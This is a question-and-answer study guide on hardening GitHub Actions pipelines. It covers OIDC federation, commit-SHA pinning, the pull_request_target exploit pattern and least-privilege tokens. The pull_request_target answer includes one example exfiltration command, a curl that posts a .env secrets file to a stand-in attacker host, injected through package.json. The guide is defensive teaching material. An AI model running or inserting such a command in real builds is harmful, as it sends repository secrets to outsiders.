# Pipeline & Supply-Chain Security

### Question 79882296-f433-48ed-8ab6-7635a906aaa3

- Why is storing static cloud credentials (`AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`) in GitHub Actions secrets considered an architectural security flaw, and how does **OpenID Connect (OIDC)** eliminate this risk?

### Answer

- **The hazard of long-lived static secrets**:
  - Static credentials stored in repository secret vaults never expire unless manually rotated.
  - If leaked via an echoing CI log, rogue third-party action, or malicious pull request, attackers gain indefinite persistent access to cloud infrastructure until an admin notices.
- **OIDC Federation Mechanics**:
  - GitHub Actions acts as an OIDC Identity Provider (IdP).
  - When a job runs, the runner requests a short-lived cryptographically signed JSON Web Token (JWT) from GitHub's OIDC service.
  - The runner presents this token to AWS/GCP/Azure via STS (Security Token Service).
  - The cloud provider verifies the signature against GitHub's public keys, validates the claims (repo, branch, environment), and issues **temporary credentials valid for only 15–60 minutes**.
  - **Result**: Zero persistent cloud keys stored in GitHub; compromised tokens expire almost immediately.

```yaml
# ✅ Modern OIDC authentication assuming temporary IAM roles without long-lived keys
permissions:
  id-token: write # Mandatory to request the OIDC JWT
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsFrontendDeployRole
      aws-region: us-east-1
```

- [More detail on Configuring OIDC in GitHub Actions](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)

---

### Question f54bb605-c21c-423d-b3c0-5a74fad056a8

- Why is referencing third-party GitHub Actions via mutable release tags (e.g., `uses: actions/checkout@v4`) a supply-chain vulnerability, and how does **Commit SHA Pinning** secure the pipeline?

### Answer

- **Mutable tag hijacking**:
  - Git tags in GitHub (such as `v4` or `v4.1.2`) are mutable pointers. An action maintainer or an attacker who compromises the maintainer's account can force-push malicious code to an existing release tag.
  - Next time your CI runs, it pulls the compromised code and executes arbitrary scripts with access to runner secrets and deployment keys.
- **Commit SHA pinning enforcement**:
  - Pin every third-party action to its full, immutable 40-character commit hash (`uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`).
  - Git commit hashes are cryptographically bound to tree content; altering the action's code changes the hash, preventing silent tampering.
  - Use automated tools like Renovate or Dependabot with `pinDigests: true` to update pinned hashes alongside release comments.

```yaml
# ❌ Vulnerable to mutable tag hijacking
- uses: some-vendor/upload-action@v2

# ✅ Hardened against supply chain compromise via immutable commit SHA pinning
- uses: some-vendor/upload-action@3b4f65342a129038237c56ef987625143a253a67 # v2.1.0
```

- [More detail on Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)

---

### Question ef1c6da3-365f-4d9d-9cf7-a6b5500f28fb

- What critical security vulnerability is introduced when using the **`pull_request_target`** event trigger in GitHub Actions workflows, and how have attackers exploited it to steal production secrets?

### Answer

- **The `pull_request_target` privilege elevation**:
  - Standard `pull_request` runs in the context of the fork/PR branch and has **zero access to repository secrets** and a read-only `GITHUB_TOKEN`.
  - `pull_request_target` runs in the context of the base repository (`main`), granting full access to repository secrets and write permissions even when triggered by an untrusted external fork.
- **The exploit mechanism**:
  - If a workflow triggers on `pull_request_target` and checks out the PR branch code:
    `actions/checkout@v4 with: ref: ${{ github.event.pull_request.head.sha }}`
  - Then runs a build script: `run: npm run build`
  - An external attacker forks the repo, edits `package.json` to inject a malicious build script (`curl -d @.env attacker.com`), and submits a PR.
  - GitHub executes the attacker's untrusted code with the repository's production secrets loaded into memory.
- **Defense rule**: Never check out untrusted pull request code in a workflow triggered by `pull_request_target` if that workflow has access to secrets.

- [More detail on Keeping Your GitHub Actions and Workflows Secure: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

---

### Question 05b0c2e7-358b-4400-985b-66d9fc15c201

- Why should workflows always specify an explicit **Least-Privilege `permissions`** block, and what danger does the default `GITHUB_TOKEN` present?

### Answer

- **The default permissive token risk**:
  - In many organizations, default `GITHUB_TOKEN` permissions allow write access to repository contents, packages, issues, and pull requests.
  - If a dependency build script or compromised action runs arbitrary code, it can use the elevated token to push commits directly to branches, publish malicious packages, or approve malicious PRs.
- **Enforcing least privilege**:
  - Set default organizational permissions to read-only.
  - In every workflow YAML file, declare a top-level `permissions: {}` block (revoking all permissions by default).
  - Explicitly grant only the precise, minimal scope required for individual jobs (e.g., `contents: read`, `pull-requests: write` for commenting bots).

```yaml
# ✅ Explicitly revoking all default permissions; granting minimal scope per job
permissions: {}

jobs:
  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read # Read-only checkout
    steps:
      - uses: actions/checkout@v4
      - run: pnpm lint
```

- [More detail on GitHub Actions Permissions](https://docs.github.com/en/actions/using-jobs/assigning-permissions-to-jobs)
